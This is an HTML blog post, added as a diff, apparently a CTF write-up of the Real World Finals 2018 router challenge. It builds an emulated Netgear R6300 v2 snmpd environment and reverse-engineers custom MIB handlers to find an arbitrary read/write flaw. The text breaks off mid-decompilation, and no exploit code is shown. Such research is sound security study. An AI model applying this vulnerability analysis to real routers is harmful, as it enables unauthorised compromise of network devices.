@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="referrer" content="no-referrer" />
+    <meta name="description" content="Building Environment搭建整个模拟路由环境并启动snmp服务路由器版本: 12Netgear R6300 v2#https:&#x2F;&#x2F;openwrt.org&#x2F;toh&#x2F;netgear&#x2F;netgear_r6300_v2 首先下载openwrt的源码(18.06.1和18.06.2皆可，只是最后EXP中偏移可能不同)配置config： 12">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Real World Finals 2018 Router">
+<meta property="og:url" content="http://yoursite.com/2019/03/07/Real-World-Finals-2018-Router/index.html">
+<meta property="og:site_name" content="Kirin&#39;s Blog">
+<meta property="og:description" content="Building Environment搭建整个模拟路由环境并启动snmp服务路由器版本: 12Netgear R6300 v2#https:&#x2F;&#x2F;openwrt.org&#x2F;toh&#x2F;netgear&#x2F;netgear_r6300_v2 首先下载openwrt的源码(18.06.1和18.06.2皆可，只是最后EXP中偏移可能不同)配置config： 12">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-025cf03df53aba8a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-f38e2d9c38fed547.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-bf21a623c4d3c9fa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-94f7451f9705b140.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-0cfb1221160bfbd8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-fe0dae425dc63bea.gif?imageMogr2/auto-orient/strip">
+<meta property="article:published_time" content="2019-03-07T03:06:18.000Z">
+<meta property="article:modified_time" content="2019-10-22T01:40:28.000Z">
+<meta property="article:author" content="Kirin">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="Router">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/7434375-025cf03df53aba8a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Real World Finals 2018 Router</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/03/12/Everything-Restart/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/03/05/CVE-2012-1856-Office-UAF/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/03/07/Real-World-Finals-2018-Router/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/03/07/Real-World-Finals-2018-Router/&text=Real World Finals 2018 Router" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/03/07/Real-World-Finals-2018-Router/&title=Real World Finals 2018 Router" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/03/07/Real-World-Finals-2018-Router/&is_video=false&description=Real World Finals 2018 Router" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Real World Finals 2018 Router&body=Check out this article: http://yoursite.com/2019/03/07/Real-World-Finals-2018-Router/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/03/07/Real-World-Finals-2018-Router/&title=Real World Finals 2018 Router" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/03/07/Real-World-Finals-2018-Router/&title=Real World Finals 2018 Router" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/03/07/Real-World-Finals-2018-Router/&title=Real World Finals 2018 Router" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/03/07/Real-World-Finals-2018-Router/&title=Real World Finals 2018 Router" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/03/07/Real-World-Finals-2018-Router/&name=Real World Finals 2018 Router&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Building-Environment"><span class="toc-number">1.</span> <span class="toc-text">Building Environment</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Find-R-W-at-Any-Address-in-MIB"><span class="toc-number">2.</span> <span class="toc-text">Find R&#x2F;W at Any Address in MIB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number">3.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Run-POC-amp-amp-Get-Shell"><span class="toc-number">4.</span> <span class="toc-text">Run POC&amp;&amp;Get Shell</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Real World Finals 2018 Router
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Kirin's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2019-03-07T03:06:18.000Z" itemprop="datePublished">2019-03-07</time>
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/PWN/" rel="tag">PWN</a>, <a class="tag-link" href="/tags/Router/" rel="tag">Router</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p><img src="https://upload-images.jianshu.io/upload_images/7434375-025cf03df53aba8a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="router"></p>
+<h2 id="Building-Environment"><a href="#Building-Environment" class="headerlink" title="Building Environment"></a>Building Environment</h2><p>搭建整个模拟路由环境并启动snmp服务<br>路由器版本:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Netgear R6300 v2</span><br><span class="line">#https:&#x2F;&#x2F;openwrt.org&#x2F;toh&#x2F;netgear&#x2F;netgear_r6300_v2</span><br></pre></td></tr></table></figure>
+<p>首先下载openwrt的源码(18.06.1和18.06.2皆可，只是最后EXP中偏移可能不同)<br>配置config：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Target System: BCM47XX&#x2F;53XX</span><br><span class="line">Target Profile: Netgear R6300 v2</span><br><span class="line">Target Images: squashfs &#x2F;&#x2F;生成文件系统即可</span><br><span class="line">Development: gdb&amp;&amp;gdbserver &#x2F;&#x2F;便于后续调试</span><br></pre></td></tr></table></figure>
+<p>而后保存配置并编译<br>在编译好的文件中找到编译好的文件系统：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># ls</span><br><span class="line">bin  etc  mnt      proc  root  sys  usr  www</span><br><span class="line">dev  lib  overlay  rom   sbin  tmp  var</span><br></pre></td></tr></table></figure>
+<p>有两个思路：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过文件系统制作镜像，再用qemu启动 #没有成功</span><br><span class="line">在qemu启动的arm虚拟机或者可以运行arm的环境下chroot开启整个环境</span><br></pre></td></tr></table></figure>
+<p>我选择直接在树莓派中搭建环境<br>(也可以在qemu system mode下的arm虚拟机中启动，后面有说明)<br>将文件系统整个放入树莓派中(包括比赛的两个ipk包)：<br>而后配置chroot环境：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo mount proc chroot_dir&#x2F;proc -t proc</span><br><span class="line">sudo mount sysfs  chroot_dir&#x2F;sys -t sysfs</span><br><span class="line">cp  &#x2F;etc&#x2F;hosts  chroot_dir&#x2F;etc&#x2F;hosts  #配置网络环境</span><br><span class="line">编辑 chroot_dir&#x2F;etc&#x2F;resolv.conf:  #配置DNS环境</span><br><span class="line">nameserver 8.8.8.8</span><br></pre></td></tr></table></figure>
+<p>开启chroot环境：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot  .  .&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
+<p>而后安装比赛的snmp环境：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">opkg install .&#x2F;libnetsnmp_5.8-1_arm_cortex-a9.ipk</span><br><span class="line">opkg install .&#x2F;snmpd_5.8-1_arm_cortex-a9.ipk</span><br><span class="line">#可能存在报错无法建立配置文件，在var下建立run文件夹即可</span><br></pre></td></tr></table></figure>
+<p>确认snmp服务启动：<br>路由器环境端:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F; # netstat -anp|grep snmpd</span><br><span class="line">udp        0      0 0.0.0.0:161             0.0.0.0:*                           1922&#x2F;snmpd</span><br><span class="line">udp        0      0 :::161                  :::*                                1922&#x2F;snmpd</span><br><span class="line">unix  2      [ ACC ]     STREAM     LISTENING      18493 1922&#x2F;snmpd          &#x2F;var&#x2F;run&#x2F;agentx.sock</span><br></pre></td></tr></table></figure>
+<p>本机端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kirin@kirin-virtual-machine:~$ snmpwalk -v 1 -c public 192.168.137.33  .1</span><br><span class="line">iso.3.6.1.4.1.2021.13.32.1.0 &#x3D; INTEGER: 0</span><br><span class="line">iso.3.6.1.4.1.2021.13.32.2.0 &#x3D; INTEGER: 1996043560</span><br><span class="line">End of MIB</span><br></pre></td></tr></table></figure>
+<p>同样得，在qemu system模式下启动的arm虚拟机也可以启动服务：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">下载内核&amp;&amp;镜像</span><br><span class="line">https:&#x2F;&#x2F;people.debian.org&#x2F;~aurel32&#x2F;qemu&#x2F;armhf&#x2F;</span><br><span class="line">配置qemu虚拟机网络：</span><br><span class="line">https:&#x2F;&#x2F;kirin-say.top&#x2F;2019&#x2F;02&#x2F;23&#x2F;Building-MIPS-Environment-for-Router-PWN&#x2F;</span><br><span class="line">启动qemu虚拟机：</span><br><span class="line">sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if&#x3D;sd,file&#x3D;debian_wheezy_armhf_standard.qcow2 -append &quot;root&#x3D;&#x2F;dev&#x2F;mmcblk0p2&quot;  -net nic,macaddr&#x3D;00:16:3e:00:00:01 -net tap </span><br><span class="line">启动服务后同样配置chroot环境运行即可</span><br></pre></td></tr></table></figure>
+<h2 id="Find-R-W-at-Any-Address-in-MIB"><a href="#Find-R-W-at-Any-Address-in-MIB" class="headerlink" title="Find R/W at Any Address in MIB"></a>Find R/W at Any Address in MIB</h2><p>在搭建的路由器环境下gdbserver运行snmpd，IDA下动态调试追踪程序流<br>可以看到snmp服务会先初始化mib，agent等环境：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LOAD:000125B8 BL              init_mib_modules</span><br><span class="line">LOAD:000125BC LDR             R0, [R10]</span><br><span class="line">LOAD:000125C0 BL              init_snmp</span><br><span class="line">LOAD:000125C4 BL              init_master_agent</span><br></pre></td></tr></table></figure>
+<p>在init_mib_modules中可以看到：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_mib_modules</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// r3</span></span><br><span class="line"></span><br><span class="line">  result = should_init();</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    result = j_init_greatSensors();</span><br><span class="line">  v1 = dword_1102C;</span><br><span class="line">  dword_11028 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !dword_1102C )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_1102C = <span class="number">1</span>;</span><br><span class="line">    result = snmp_register_callback(v1, <span class="number">2</span>, (<span class="keyword">int</span>)sub_9D4);</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">      result = snmp_log(<span class="number">3</span>, <span class="string">"error registering for SHUTDOWN callback for mib modules\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其会先调用init_greatSensors()注册回调函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">LOAD:000008E0 init_greatSensors                       ; CODE XREF: j_init_greatSensors+8↑j</span><br><span class="line">LOAD:000008E0                                         ; DATA XREF: LOAD:000002D8↑o ...</span><br><span class="line">LOAD:000008E0</span><br><span class="line">LOAD:000008E0 var_70          &#x3D; -0x70</span><br><span class="line">LOAD:000008E0 var_64          &#x3D; -0x64</span><br><span class="line">LOAD:000008E0 var_60          &#x3D; -0x60</span><br><span class="line">LOAD:000008E0 var_38          &#x3D; -0x38</span><br><span class="line">LOAD:000008E0</span><br><span class="line">LOAD:000008E0                 LDR             R12, &#x3D;(dword_A88 - 0x8FC)</span><br><span class="line">LOAD:000008E4                 STMFD           SP!, &#123;R4,R5,LR&#125;</span><br><span class="line">LOAD:000008E8                 SUB             SP, SP, #0x64</span><br><span class="line">LOAD:000008EC                 ADD             LR, SP, #0x70+var_60</span><br><span class="line">LOAD:000008F0                 LDR             R5, &#x3D;(_GLOBAL_OFFSET_TABLE_ - 0x90C)</span><br><span class="line">LOAD:000008F4                 ADD             R12, PC, R12 ; dword_A88</span><br><span class="line">LOAD:000008F8                 MOV             R4, R12</span><br><span class="line">LOAD:000008FC                 ADD             R12, R12, #0x28</span><br><span class="line">LOAD:00000900                 LDMIA           R4!, &#123;R0-R3&#125;</span><br><span class="line">LOAD:00000904                 ADD             R5, PC, R5 ; _GLOBAL_OFFSET_TABLE_</span><br><span class="line">LOAD:00000908                 STMIA           LR!, &#123;R0-R3&#125;</span><br><span class="line">LOAD:0000090C                 LDMIA           R4!, &#123;R0-R3&#125;</span><br><span class="line">LOAD:00000910                 STMIA           LR!, &#123;R0-R3&#125;</span><br><span class="line">LOAD:00000914                 LDMIA           R4, &#123;R0,R1&#125;</span><br><span class="line">LOAD:00000918                 MOV             R4, #3</span><br><span class="line">LOAD:0000091C                 STMIA           LR, &#123;R0,R1&#125;</span><br><span class="line">LOAD:00000920                 ADD             LR, SP, #0x70+var_38</span><br><span class="line">LOAD:00000924                 LDMIA           R12!, &#123;R0-R3&#125;</span><br><span class="line">LOAD:00000928                 STMIA           LR!, &#123;R0-R3&#125;</span><br><span class="line">LOAD:0000092C                 LDMIA           R12!, &#123;R0-R3&#125;</span><br><span class="line">LOAD:00000930                 STMIA           LR!, &#123;R0-R3&#125;</span><br><span class="line">LOAD:00000934                 ADD             R2, SP, #0x70+var_60</span><br><span class="line">LOAD:00000938                 LDMIA           R12, &#123;R0,R1&#125;</span><br><span class="line">LOAD:0000093C                 LDR             R3, &#x3D;(off_10FFC - 0x10FAC)</span><br><span class="line">LOAD:00000940                 STMIA           LR, &#123;R0,R1&#125;</span><br><span class="line">LOAD:00000944                 LDR             R0, &#x3D;(aGreatmiscsenso - 0x958)</span><br><span class="line">LOAD:00000948                 LDR             R3, [R5,R3] ; handle_greatMiscSensorsDevice</span><br><span class="line">LOAD:0000094C                 STR             R4, [SP,#0x70+var_70]</span><br><span class="line">LOAD:00000950                 ADD             R0, PC, R0 ; &quot;greatMiscSensorsDevice&quot;</span><br><span class="line">LOAD:00000954                 STR             R3, [SP,#0x70+var_64]</span><br><span class="line">LOAD:00000958                 MOV             R3, #0xA</span><br><span class="line">LOAD:0000095C                 LDR             R1, [SP,#0x70+var_64]</span><br><span class="line">LOAD:00000960                 BL              netsnmp_create_handler_registration</span><br><span class="line">LOAD:00000964                 BL              netsnmp_register_scalar</span><br><span class="line">LOAD:00000968                 LDR             R3, &#x3D;(off_10FF0 - 0x10FAC)</span><br><span class="line">LOAD:0000096C                 ADD             R2, SP, #0x70+var_38</span><br><span class="line">LOAD:00000970                 LDR             R0, &#x3D;(aGreatmiscsenso_0 - 0x980)</span><br><span class="line">LOAD:00000974                 LDR             R3, [R5,R3] ; handle_greatMiscSensorsIndex</span><br><span class="line">LOAD:00000978                 ADD             R0, PC, R0 ; &quot;greatMiscSensorsIndex&quot;</span><br><span class="line">LOAD:0000097C                 STR             R4, [SP,#0x70+var_70]</span><br><span class="line">LOAD:00000980                 STR             R3, [SP,#0x70+var_64]</span><br><span class="line">LOAD:00000984                 MOV             R3, #0xA</span><br><span class="line">LOAD:00000988                 LDR             R1, [SP,#0x70+var_64]</span><br><span class="line">LOAD:0000098C                 BL              netsnmp_create_handler_registration</span><br><span class="line">LOAD:00000990                 BL              netsnmp_register_scalar</span><br><span class="line">LOAD:00000994                 MOV             R0, #0x78 ; &#39;x&#39; ; size_t</span><br><span class="line">LOAD:00000998                 BL              malloc</span><br><span class="line">LOAD:0000099C                 LDR             R3, &#x3D;(vla_str - 0x9AC)</span><br><span class="line">LOAD:000009A0                 MOV             R2, #0</span><br><span class="line">LOAD:000009A4                 ADD             R3, PC, R3 ; vla_str</span><br><span class="line">LOAD:000009A8                 STR             R0, [R3,#(mib_address - 0x11020)]</span><br><span class="line">LOAD:000009AC                 STR             R2, [R3]</span><br><span class="line">LOAD:000009B0                 ADD             SP, SP, #0x64</span><br><span class="line">LOAD:000009B4                 LDMFD           SP!, &#123;R4,R5,PC&#125;</span><br><span class="line">LOAD:000009B4 ; End of function init_greatSensors</span><br></pre></td></tr></table></figure>
+<p>可以看到其注册了两个回调函数，动态调试下看到注册过程：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">sub_76F59344</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// r5@1</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// r6@1</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// r7@1</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// r4@1</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// r5@2</span></span><br><span class="line"></span><br><span class="line">  v4 = a1;</span><br><span class="line">  v5 = a3;</span><br><span class="line">  v6 = a4;</span><br><span class="line">  v7 = ((<span class="keyword">int</span> (__cdecl *)(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>))unk_76F4D74C)(a1, a2, a3);</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = ((<span class="keyword">int</span> (__fastcall *)(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>))unk_76F4C0D8)(v4, v7, v5, v6);</span><br><span class="line">    <span class="keyword">if</span> ( !v8 )</span><br><span class="line">      ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">int</span>))unk_76F4C228)(v7);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先是写入函数地址：<br><img src="https://upload-images.jianshu.io/upload_images/7434375-f38e2d9c38fed547.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="address"><br>而后函数名称：<br><img src="https://upload-images.jianshu.io/upload_images/7434375-bf21a623c4d3c9fa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="function name"><br>而后mib对象对应的OID：<br><img src="https://upload-images.jianshu.io/upload_images/7434375-94f7451f9705b140.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="OID"><br>可以看到此OID：1.3.6.1.4.1.2021.13.32.2.0<br>当利用snmpset/snmpget对此对象进行读写操作时，会利用netsnmp_call_handler函数处理对象，最终调用对应此OID的回调函数：handle_greatMiscSensorsDevice函数<br>netsnmp_call_handler关键部分：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v10 &#x3D; (int (__fastcall *)(int *, int, int *, int))v8[3];</span><br><span class="line">if ( !v10 )</span><br><span class="line">        break;</span><br><span class="line">se_find_label_in_slist((int)&quot;agent_mode&quot;, *v6);</span><br><span class="line">result &#x3D; v10(v8, v9, v6, v7);</span><br><span class="line">v12 &#x3D; v8[2];</span><br></pre></td></tr></table></figure>
+<p>同样另一个回调函数handle_greatMiscSensorsIndex对应OID：<br><img src="https://upload-images.jianshu.io/upload_images/7434375-0cfb1221160bfbd8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="OID"><br>即：1.3.6.1.4.1.2021.13.32.1.0<br>这时候关注两个回调函数，发现了任意地址读写：<br>handle_greatMiscSensorsDevice：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">handle_greatMiscSensorsDevice</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, 